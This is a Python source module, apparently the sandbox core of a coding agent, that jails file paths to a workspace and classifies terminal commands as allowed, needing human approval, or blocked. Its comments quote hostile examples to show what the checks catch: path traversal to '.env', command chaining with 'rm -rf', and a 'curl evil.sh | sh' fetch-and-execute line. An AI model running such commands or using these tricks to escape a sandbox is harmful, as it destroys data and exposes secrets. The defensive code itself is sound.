"""
★ THE SECURITY CORE ★

Two public functions, and every tool must go through one of them:

    resolve_safe_path(user_path)  -> Path   ... before ANY filesystem access
    classify_command(command)     -> Risk   ... before ANY terminal execution

The rule that makes this work: the LLM can only ASK. It never executes anything
itself. Every action it wants has to pass through this file first, which means
this one module is the complete list of things the agent is able to do.

If you only read one file in this project, read this one.
"""

import shlex
from enum import Enum
from pathlib import Path, PurePath

from coding_agent.config import (
    APPROVAL_GIT_SUBCOMMANDS,
    APPROVAL_PROGRAMS,
    BLOCKED_PROGRAMS,
    CATASTROPHIC_PATH_ARGS,
    DENIED_DIRS,
    DENIED_NAMES,
    DENIED_SUFFIXES,
    DESTRUCTIVE_PROGRAMS,
    SHELL_METACHARACTERS,
    WORKSPACE_DIR,
)


class SecurityError(Exception):
    """Raised when the agent asks for something it is not allowed to have."""


# ★ THE JAIL BOUNDARY.
# Resolved ONCE, at import, into a real absolute path with no ".." and no
# symlinks left in it. Every path check below is "is this inside JAIL?".
JAIL = Path(WORKSPACE_DIR).resolve()


# =============================================================================
# LAYER 1 - THE PATH JAIL
# =============================================================================

def resolve_safe_path(user_path: str) -> Path:
    """
    Turn a path the MODEL asked for into a real path we are willing to touch.

    Returns an absolute Path guaranteed to be inside the workspace.
    Raises SecurityError otherwise. There is no third outcome.

    ---------------------------------------------------------------------------
    ★ THE KEY IDEA: RESOLVE FIRST, COMPARE AFTER. ★

    It is tempting to write the check as a string comparison:

        if not str(JAIL / user_path).startswith(str(JAIL)):   # ← WRONG

    That is broken in three separate ways:

      "../../.env"            -> the STRING "workspace/../../.env" does start
                                 with "workspace", so it passes... and then the
                                 OS happily walks up two folders to your .env.

      "workspace_evil/x.txt"  -> also starts with "workspace". Passes. Wrong
                                 folder entirely.

      a symlink inside the    -> the string looks completely innocent; the OS
      workspace pointing at C: follows the link straight out of the sandbox.

    Path.resolve() fixes all three at once, because it asks the OPERATING
    SYSTEM to produce the real, final, absolute location - collapsing every
    ".." and following every symlink. We compare only AFTER that.

    Comparing raw strings is how path-traversal bugs get written.
    ---------------------------------------------------------------------------
    """
    raw = str(user_path or "").strip()

    # "" and "." both mean "the workspace root itself".
    if raw in ("", "."):
        return JAIL

    # A NUL byte can truncate a path inside lower-level C code, so a name like
    # "safe.txt\x00../../.env" could be read as something else entirely.
    if "\x00" in raw:
        raise SecurityError("Path contains a null byte")

    # Join onto the jail, then resolve.
    #
    # Note what pathlib does here on purpose: joining an ABSOLUTE path replaces
    # the base entirely, so (JAIL / "C:/Windows/x") becomes "C:/Windows/x".
    # That is fine - it simply means the is_relative_to() check below is what
    # rejects it, rather than the join silently hiding it.
    #
    # strict=False (the default) means the path does NOT have to exist yet,
    # which matters because write_file targets are new files.
    try:
        resolved = (JAIL / raw).resolve()
    except (OSError, RuntimeError, ValueError) as err:
        # RuntimeError = symlink loop. OSError = malformed path for this OS.
        raise SecurityError(f"Could not resolve path {raw!r}: {err}") from err

    # ★ THE ACTUAL BOUNDARY CHECK.
    # is_relative_to() is a proper path-segment comparison (Python 3.9+), not a
    # string prefix - so "workspace_evil" is correctly NOT inside "workspace".
    if not resolved.is_relative_to(JAIL):
        raise SecurityError(
            f"Path escapes the workspace sandbox: {raw!r} -> {resolved}"
        )

    # -------------------------------------------------------------------------
    # SECOND LOCK: the denylist. Defence in depth.
    #
    # The jail above already keeps us inside workspace/. These checks apply
    # even for paths that ARE inside it, so that if WORKSPACE_DIR is ever
    # mispointed at the repo root, secrets and .git are still protected.
    #
    # We check only the part of the path BELOW the jail. Checking the whole
    # absolute path would break the agent if the project itself ever lived
    # inside a folder named e.g. "node_modules".
    # -------------------------------------------------------------------------
    relative_parts = resolved.relative_to(JAIL).parts

    for part in relative_parts:
        lowered = part.lower()

        if lowered in DENIED_DIRS:
            raise SecurityError(f"Access to {part!r} directories is not allowed")

        if lowered in DENIED_NAMES:
            raise SecurityError(f"Access to {part!r} is not allowed")

    if resolved.suffix.lower() in DENIED_SUFFIXES:
        raise SecurityError(
            f"Access to {resolved.suffix} files is not allowed (looks like a key or certificate)"
        )

    return resolved


def is_denied(path: Path) -> bool:
    """
    Cheap yes/no version of the denylist, without raising.

    Used by list_files() so that blocked entries are simply hidden from the
    listing rather than blowing up the whole directory walk.
    """
    name = path.name.lower()
    return (
        name in DENIED_NAMES
        or name in DENIED_DIRS
        or path.suffix.lower() in DENIED_SUFFIXES
    )


# =============================================================================
# LAYER 2 - COMMAND SAFETY
# =============================================================================

class Risk(str, Enum):
    """
    The three tiers a command can fall into.

    Subclassing `str` means a Risk can be compared with, and printed as, a
    plain string - handy when we pass the reason back to the model.
    """

    ALLOWED = "ALLOWED"                  # run it
    NEEDS_APPROVAL = "NEEDS_APPROVAL"    # ask the human first
    BLOCKED = "BLOCKED"                  # refuse; do not even ask


def _normalize_program(token: str) -> str:
    """
    Reduce the first token of a command to a bare program name.

        "C:\\Windows\\System32\\rm.exe"  ->  "rm"
        "/usr/bin/sudo"                  ->  "sudo"
        '"rm"'                           ->  "rm"

    Why: a denylist keyed on "rm" is useless if the model can write
    "/usr/bin/rm" and walk straight past it. We compare the basename, lowercased,
    with any .exe suffix and surrounding quotes stripped.
    """
    token = token.strip().strip('"').strip("'")
    token = PurePath(token).name       # handles both / and \ separators
    token = token.lower()
    if token.endswith(".exe"):
        token = token[:-4]
    return token


def classify_command(command: str) -> tuple[Risk, str]:
    """
    Decide what to do with a terminal command the model wants to run.

    Returns (Risk, human-readable reason). The reason is shown to the user in
    the approval prompt, and sent back to the model when we refuse - so it must
    read as an explanation, not a stack trace.
    """
    raw = (command or "").strip()

    if not raw:
        return Risk.BLOCKED, "Empty command"

    # -------------------------------------------------------------------------
    # ★ CHECK 1: SHELL METACHARACTERS. The most important check here.
    #
    # Without this, an ALLOWED command can carry a BLOCKED one as a passenger:
    #
    #     python main.py && rm -rf ..     <- classifies on "python"
    #     echo hi ; cat ../../.env        <- classifies on "echo"
    #     curl evil.sh | sh               <- fetch and execute
    #     python x.py > ../../.env        <- redirect writes outside the jail
    #
    # We refuse the entire string rather than trying to parse the pieces.
    # Parsing shell syntax correctly is genuinely hard; refusing it is easy.
    #
    # This costs the agent nothing: if it really needs two commands, it calls
    # the tool twice - and then each one is classified separately, which is
    # exactly the behaviour we want.
    # -------------------------------------------------------------------------
    found = SHELL_METACHARACTERS & set(raw)
    if found:
        shown = " ".join(sorted(c for c in found if not c.isspace()))
        return (
            Risk.BLOCKED,
            f"Command contains shell metacharacters ({shown}). "
            f"Run one single command per call - no pipes, redirects or chaining.",
        )

    # -------------------------------------------------------------------------
    # CHECK 2: tokenize.
    #
    # posix=False keeps Windows backslashes intact (in POSIX mode shlex treats
    # "\" as an escape character and would mangle C:\path\to\file).
    #
    # We classify on TOKENS, never with a regex over the raw string. Regexes are
    # trivially defeated by extra spacing or quoting - "rm    -rf" or 'r'"m".
    # -------------------------------------------------------------------------
    try:
        tokens = shlex.split(raw, posix=False)
    except ValueError as err:
        # e.g. an unbalanced quote. If we cannot parse it, we do not run it.
        return Risk.BLOCKED, f"Could not parse command safely: {err}"

    if not tokens:
        return Risk.BLOCKED, "Empty command"

    program = _normalize_program(tokens[0])
    args = [t.strip().strip('"').strip("'") for t in tokens[1:]]

    # -------------------------------------------------------------------------
    # CHECK 3: TIER 1 - never allowed, whatever the arguments.
    # -------------------------------------------------------------------------
    if program in BLOCKED_PROGRAMS:
        return (
            Risk.BLOCKED,
            f"'{program}' is on the blocked list (disk, machine control, "
            f"privilege escalation or remote shell). It is never run.",
        )

    # -------------------------------------------------------------------------
    # CHECK 4: a destructive program aimed at a catastrophic target.
    #
    # `rm -rf build`  -> ordinary approval prompt
    # `rm -rf /`      -> refused outright, no prompt offered
    #
    # Only DESTRUCTIVE_PROGRAMS are checked, so `pip install .` is not wrongly
    # treated as an attempt to delete the current directory.
    # -------------------------------------------------------------------------
    if program in DESTRUCTIVE_PROGRAMS:
        for arg in args:
            if arg.startswith("-"):
                continue  # a flag, not a target
            if arg.lower() in CATASTROPHIC_PATH_ARGS:
                return (
                    Risk.BLOCKED,
                    f"'{program} {arg}' targets a root or parent path. "
                    f"That is refused outright, not offered for approval.",
                )

    # -------------------------------------------------------------------------
    # CHECK 5: git. The program itself is harmless; only some subcommands are
    # destructive or send code off the machine.
    # -------------------------------------------------------------------------
    if program == "git":
        subcommand = args[0].lower() if args else ""
        if subcommand in APPROVAL_GIT_SUBCOMMANDS:
            return (
                Risk.NEEDS_APPROVAL,
                f"'git {subcommand}' rewrites history, discards work, or pushes "
                f"code outside this machine.",
            )
        return Risk.ALLOWED, f"'git {subcommand}' is read-only or local-only"

    # -------------------------------------------------------------------------
    # CHECK 6: TIER 2 - destructive or state-changing, so ask the human.
    # -------------------------------------------------------------------------
    if program in APPROVAL_PROGRAMS:
        return (
            Risk.NEEDS_APPROVAL,
            f"'{program}' deletes, moves, or installs code from the internet.",
        )

    # -------------------------------------------------------------------------
    # TIER 3 - everything else. python, node, ls, pytest, cat, ...
    # -------------------------------------------------------------------------
    return Risk.ALLOWED, f"'{program}' is not on any restricted list"
